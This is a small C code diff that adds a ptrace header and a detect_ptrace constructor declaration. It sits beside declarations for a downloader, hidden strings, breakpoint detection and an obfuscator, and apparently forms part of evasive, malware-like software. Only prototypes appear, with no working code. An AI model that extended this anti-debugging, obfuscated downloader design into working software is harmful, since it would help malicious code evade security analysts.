@@ -10,6 +10,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <netdb.h>
+#include <sys/ptrace.h>
 #include "../tools/obfuscator/obfuscator.h"
 
 // macros to simplify writing function attributes
@@ -47,3 +48,4 @@ always_inline optimize(opt) static inline void process_connection(int);
 always_inline optimize(opt) static inline void downloader();
 always_inline optimize(opt) static inline char* hidden_string();
 constructor optimize(opt) void detect_breakpoints();
+constructor optimize(opt) void detect_ptrace();
